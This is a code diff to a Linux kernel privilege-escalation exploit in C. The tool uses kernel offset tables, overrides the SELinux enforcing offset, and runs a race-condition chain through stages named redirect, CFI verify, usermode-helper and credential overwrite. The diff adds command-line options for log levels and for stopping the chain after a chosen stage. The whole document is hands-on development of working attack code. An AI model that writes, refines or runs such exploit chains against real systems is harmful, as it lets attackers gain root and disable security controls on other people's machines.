@@ -17,6 +17,8 @@
 
 const struct kernel_offsets *active_offsets = NULL;
 int route_only_mode;
+/* 0=quiet, 1=info (default), 2=debug; set by --log=/DN_LOG in main(). */
+int dn_log_level = 1;
 
 /* Override target.h _OFF macros with dynamic offsets from offsets.h table */
 #undef SELINUX_ENFORCING_OFF
@@ -216,13 +218,17 @@ void *consumer_thread(void *arg __attribute__((unused))) {
         if (atomic_load(&punch_consume_stop) ||
             atomic_load(&punch_consume_go) != seq) break;
         atomic_fetch_add(&consumer_calls, 1);
-        pr_info("consumer: walk begin tid=%d\n", tid); fsync(1);
+        if (dn_log_level >= 2) {  /* timing-sensitive: --log=debug only */
+          pr_info("consumer: walk begin tid=%d\n", tid); fsync(1);
+        }
         errno = 0;
         long sched_ret = env_flag("NO_WALK", 0)
                              ? 0
                              : sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
         int sched_errno = errno;
-        pr_info("consumer: walk end ret=%ld errno=%d\n", sched_ret, sched_errno); fsync(1);
+        if (dn_log_level >= 2) {
+          pr_info("consumer: walk end ret=%ld errno=%d\n", sched_ret, sched_errno); fsync(1);
+        }
         if (sched_ret != 0) {
           errno = 0;
           struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
@@ -1041,19 +1047,59 @@ static int run_route_only(int argc, char **argv) {
   return 0;
 }
 
+static void cli_apply_stop_after(const char *stage) {
+  if (strcmp(stage, "redirect") == 0) {
+    setenv("ONLY_FOPS", "1", 1);
+  } else if (strcmp(stage, "verify") == 0) {
+    setenv("ONLY_FOPS", "1", 1);
+    setenv("CFI_STOP_VERIFY", "1", 1);
+  } else if (strcmp(stage, "umh") == 0) {
+    setenv("SKIP_CRED", "1", 1);
+  } else if (strcmp(stage, "cred") == 0) {
+    setenv("SKIP_UMH", "1", 1);
+  } else if (strcmp(stage, "full") == 0) {
+    /* run the whole chain */
+  } else {
+    pr_warning("cli: unknown --stop-after=%s (redirect|verify|umh|cred|full)\n",
+               stage);
+  }
+}
+
+/* Thin CLI layer over the existing env flags, so old env-only commands keep
+ * working. Handles: --log=quiet|info|debug, --stop-after=<stage>. */
+static void cli_parse(int argc, char **argv) {
+  for (int i = 1; i < argc; i++) {
+    if (strncmp(argv[i], "--log=", 6) == 0) {
+      const char *v = argv[i] + 6;
+      dn_log_level = (strcmp(v, "quiet") == 0) ? 0
+                   : (strcmp(v, "debug") == 0) ? 2 : 1;
+    } else if (strncmp(argv[i], "--stop-after=", 13) == 0) {
+      cli_apply_stop_after(argv[i] + 13);
+    }
+  }
+  const char *e = getenv("DN_LOG");
+  if (e && *e) {
+    dn_log_level = (strcmp(e, "quiet") == 0) ? 0
+                 : (strcmp(e, "debug") == 0) ? 2 : 1;
+  }
+}
+
 int main(int argc, char **argv) {
   /* The panic workflow depends on the log surviving an Oops: with stdout
    * redirected to a file it is block-buffered and everything printed between
    * flushes is lost (gl.log ended up 0 bytes after every crash). */
   setvbuf(stdout, NULL, _IONBF, 0);
   setvbuf(stderr, NULL, _IONBF, 0);
-    setvbuf(stdout, NULL, _IONBF, 0);
-    handle_umh_mode(argc, argv);
-    if (argc > 1 && strcmp(argv[1], "--bootstrap") == 0)
-        return run_bootstrap();
-    if (argc > 1 && strcmp(argv[1], "--write1") == 0)
-        return run_write1_only();
-    if (argc > 5 && strcmp(argv[1], "--route") == 0)
-        return run_route_only(argc, argv);
-    return run_exploit(argc, argv);
+
+  cli_parse(argc, argv);
+  pr_debug("cli: log_level=%d\n", dn_log_level);
+
+  handle_umh_mode(argc, argv);
+  if (argc > 1 && strcmp(argv[1], "--bootstrap") == 0)
+      return run_bootstrap();
+  if (argc > 1 && strcmp(argv[1], "--write1") == 0)
+      return run_write1_only();
+  if (argc > 5 && strcmp(argv[1], "--route") == 0)
+      return run_route_only(argc, argv);
+  return run_exploit(argc, argv);
 }
